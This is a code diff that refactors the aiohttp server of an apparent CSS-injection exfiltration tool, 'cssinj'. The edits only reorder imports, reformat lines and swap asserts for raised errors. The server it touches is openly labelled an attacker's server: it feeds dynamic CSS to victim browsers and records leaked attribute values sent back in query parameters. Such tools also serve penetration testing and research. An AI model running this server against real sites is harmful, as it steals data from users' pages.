@@ -1,10 +1,12 @@
-from cssinj.exfiltrator import injection
+import asyncio
+
+from aiohttp import web
+
 from cssinj.client import Client
 from cssinj.console import Console
+from cssinj.exfiltrator import injection
 from cssinj.utils.dom import Attribut, Element
 from cssinj.utils.error import InjectionError
-from aiohttp import web
-import asyncio
 
 
 class Server:
@@ -17,9 +19,7 @@ class Server:
         self.method = args.method
         self.clients = clients
         self.output_file = output_file
-        self.app = web.Application(
-            middlewares=[self.error_middleware, self.dynamic_router_middleware]
-        )
+        self.app = web.Application(middlewares=[self.error_middleware, self.dynamic_router_middleware])
 
     async def start(self):
         self.runner = web.AppRunner(self.app)
@@ -27,17 +27,15 @@ class Server:
 
         site = web.TCPSite(self.runner, self.hostname, self.port)
         await site.start()
-        Console.log(
-            "server", f"Attacker's server started on {self.hostname}:{self.port}"
-        )
+        Console.log("server", f"Attacker's server started on {self.hostname}:{self.port}")
         while True:
             await asyncio.sleep(3600)
 
     async def stop(self):
-        Console.log("server", f"Attacker's server cleaning up.")
+        Console.log("server", "Attacker's server cleaning up.")
         if self.runner:
             await self.runner.cleanup()
-        Console.log("server", f"Attacker's server stopped.")
+        Console.log("server", "Attacker's server stopped.")
 
     async def handle_start(self, request):
         client = Client(
@@ -77,7 +75,8 @@ class Server:
 
         client = self.clients[client_id]
 
-        assert client is not None, InjectionError(f"Unknown client id")
+        if client is None:
+            raise InjectionError("Unknown client id")
 
         element = Element(name=self.element)
         element.attributs.append(Attribut(name=self.attribut, value=client.data))
@@ -95,7 +94,7 @@ class Server:
         client.data = ""
 
         return web.Response(
-            text=f"ok",
+            text="ok",
             content_type="text/css",
         )
 
@@ -103,7 +102,8 @@ class Server:
         client_id = request.query.get("cid")
         client = self.clients[client_id]
 
-        assert client is not None, InjectionError(f"Unknown client id")
+        if client is None:
+            raise InjectionError("Unknown client id")
 
         client.counter += 1
 
@@ -126,7 +126,8 @@ class Server:
         client_id = request.query.get("cid")
         client = self.clients[client_id]
 
-        assert client is not None, InjectionError(f"Unknown client id")
+        if client is None:
+            raise InjectionError("Unknown client id")
 
         client.event.set()
         client.data = request.query.get("t")
